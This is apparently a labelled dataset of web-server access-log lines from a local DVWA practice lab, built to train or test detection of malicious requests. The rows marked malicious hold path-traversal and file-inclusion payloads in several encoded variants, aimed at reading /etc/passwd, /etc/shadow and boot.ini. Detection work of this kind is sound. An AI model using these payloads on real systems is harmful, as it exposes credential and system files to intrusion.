,url,malicious
176,"127.0.0.1 - - [28/Apr/2021:22:30:44 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
199,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
86,"127.0.0.1 - - [28/Apr/2021:22:30:38 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow%5e%5e HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
230,"127.0.0.1 - - [28/Apr/2021:21:42:17 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
134,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
144,"127.0.0.1 - - [28/Apr/2021:22:32:49 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
225,"127.0.0.1 - - [28/Apr/2021:22:51:09 -0400] ""GET /DVWA/vulnerabilities/xss_d/?default=English HTTP/1.1"" 200 1773 ""http://127.0.0.1/DVWA/vulnerabilities/xss_d/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
192,"127.0.0.1 - - [28/Apr/2021:22:32:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
206,"127.0.0.1 - - [28/Apr/2021:22:33:02 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
36,"127.0.0.1 - - [28/Apr/2021:22:32:29 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
156,"127.0.0.1 - - [28/Apr/2021:22:19:40 -0400] ""GET /DVWA/dvwa/css/login.css HTTP/1.1"" 200 741 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14,"127.0.0.1 - - [28/Apr/2021:22:11:37 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
228,"127.0.0.1 - - [28/Apr/2021:22:33:06 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
146,"127.0.0.1 - - [28/Apr/2021:22:30:39 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 2385 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
82,"127.0.0.1 - - [28/Apr/2021:22:32:04 -0400] ""GET /DVWA/vulnerabilities/fi/?page=C%3a%5cboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
100,"127.0.0.1 - - [28/Apr/2021:22:50:47 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1590 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
74,"127.0.0.1 - - [28/Apr/2021:22:32:25 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
101,"127.0.0.1 - - [28/Apr/2021:21:59:01 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1631 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
208,"127.0.0.1 - - [28/Apr/2021:21:42:20 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 1957 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
234,"127.0.0.1 - - [28/Apr/2021:22:12:31 -0400] ""GET /DVWA/security.php HTTP/1.1"" 200 2398 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
79,"127.0.0.1 - - [28/Apr/2021:22:30:35 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2A HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
35,"127.0.0.1 - - [28/Apr/2021:22:31:25 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
85,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 488 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
124,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
123,"127.0.0.1 - - [28/Apr/2021:22:14:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1"" 200 2422 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
3,"127.0.0.1 - - [28/Apr/2021:21:58:09 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
94,"127.0.0.1 - - [28/Apr/2021:21:44:11 -0400] ""POST /DVWA/setup.php HTTP/1.1"" 302 342 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
63,"127.0.0.1 - - [28/Apr/2021:22:50:29 -0400] ""GET /DVWA/vulnerabilities/csrf/ HTTP/1.1"" 200 1808 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
24,"127.0.0.1 - - [28/Apr/2021:22:50:50 -0400] ""GET /DVWA/vulnerabilities/captcha/ HTTP/1.1"" 200 1809 ""http://127.0.0.1/DVWA/vulnerabilities/upload/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
211,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
30,"127.0.0.1 - - [28/Apr/2021:22:50:52 -0400] ""GET /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1"" 200 1682 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
227,"127.0.0.1 - - [28/Apr/2021:22:31:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
152,"127.0.0.1 - - [28/Apr/2021:22:50:54 -0400] ""GET /DVWA/vulnerabilities/sqli/ HTTP/1.1"" 200 1638 ""http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
92,"127.0.0.1 - - [28/Apr/2021:22:30:34 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts HTTP/1.1"" 200 1476 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
137,"127.0.0.1 - - [28/Apr/2021:22:15:03 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
117,"127.0.0.1 - - [28/Apr/2021:22:51:06 -0400] ""GET /DVWA/vulnerabilities/xss_d/ HTTP/1.1"" 200 1773 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
196,"127.0.0.1 - - [28/Apr/2021:21:53:44 -0400] ""POST /DVWA/login.php HTTP/1.1"" 302 337 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
215,"127.0.0.1 - - [28/Apr/2021:21:54:08 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
19,"127.0.0.1 - - [28/Apr/2021:21:58:13 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/upload/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
118,"127.0.0.1 - - [28/Apr/2021:21:53:28 -0400] ""GET /DVWA/dvwa/css/login.css HTTP/1.1"" 200 741 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17,"127.0.0.1 - - [28/Apr/2021:21:58:21 -0400] ""GET /DVWA/dvwa/css/login.css HTTP/1.1"" 200 741 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
29,"127.0.0.1 - - [28/Apr/2021:21:53:44 -0400] ""GET /DVWA/login.php HTTP/1.1"" 200 1012 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
87,"127.0.0.1 - - [28/Apr/2021:22:30:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%5e%5e HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
170,"127.0.0.1 - - [28/Apr/2021:22:30:43 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
113,"127.0.0.1 - - [28/Apr/2021:22:12:25 -0400] ""GET /DVWA/about.php HTTP/1.1"" 200 2294 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
154,"127.0.0.1 - - [28/Apr/2021:21:49:05 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 2102 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
126,"127.0.0.1 - - [28/Apr/2021:21:54:18 -0400] ""GET /DVWA/vulnerabilities/exec/ HTTP/1.1"" 200 1721 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
44,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 1979 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
167,"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
115,"127.0.0.1 - - [28/Apr/2021:21:49:04 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
205,"127.0.0.1 - - [28/Apr/2021:22:32:14 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
50,"127.0.0.1 - - [28/Apr/2021:22:19:40 -0400] ""GET /DVWA/dvwa/images/login_logo.png HTTP/1.1"" 200 9375 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
42,"127.0.0.1 - - [28/Apr/2021:22:30:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
119,"127.0.0.1 - - [28/Apr/2021:21:58:07 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1675 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
164,"127.0.0.1 - - [28/Apr/2021:21:54:08 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
147,"127.0.0.1 - - [28/Apr/2021:22:32:33 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
161,"127.0.0.1 - - [28/Apr/2021:22:31:27 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
6,"127.0.0.1 - - [28/Apr/2021:22:12:31 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
171,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
60,"127.0.0.1 - - [28/Apr/2021:22:30:45 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
98,"127.0.0.1 - - [28/Apr/2021:21:44:11 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9,"127.0.0.1 - - [28/Apr/2021:22:32:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2flocalstart%2easp HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
121,"127.0.0.1 - - [28/Apr/2021:22:30:55 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cshadow%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
183,"127.0.0.1 - - [28/Apr/2021:21:58:21 -0400] ""GET /DVWA/dvwa/images/login_logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
159,"127.0.0.1 - - [28/Apr/2021:21:49:04 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
216,"127.0.0.1 - - [28/Apr/2021:21:58:58 -0400] ""GET /DVWA/index.php HTTP/1.1"" 200 2877 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
160,"127.0.0.1 - - [28/Apr/2021:22:30:57 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
62,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
21,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
169,"127.0.0.1 - - [28/Apr/2021:21:58:07 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
223,"127.0.0.1 - - [28/Apr/2021:21:40:41 -0400] ""GET /DVWA/ HTTP/1.1"" 200 532 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
47,"127.0.0.1 - - [28/Apr/2021:22:12:28 -0400] ""GET /DVWA/dvwa/images/lock.png HTTP/1.1"" 200 1045 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
93,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
200,"127.0.0.1 - - [28/Apr/2021:22:11:39 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1631 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
38,"127.0.0.1 - - [28/Apr/2021:21:58:58 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 488 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
150,"127.0.0.1 - - [28/Apr/2021:22:12:28 -0400] ""GET /DVWA/security.php HTTP/1.1"" 200 2383 ""http://127.0.0.1/DVWA/about.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
204,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10,"127.0.0.1 - - [28/Apr/2021:21:54:18 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 625 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
186,"127.0.0.1 - - [28/Apr/2021:22:50:51 -0400] ""GET /DVWA/vulnerabilities/sqli/ HTTP/1.1"" 200 1638 ""http://127.0.0.1/DVWA/vulnerabilities/captcha/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
122,"127.0.0.1 - - [28/Apr/2021:22:30:36 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
145,"127.0.0.1 - - [28/Apr/2021:22:31:15 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00%2ehtml HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
231,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13,"127.0.0.1 - - [28/Apr/2021:21:42:17 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 488 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
220,"127.0.0.1 - - [28/Apr/2021:22:32:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
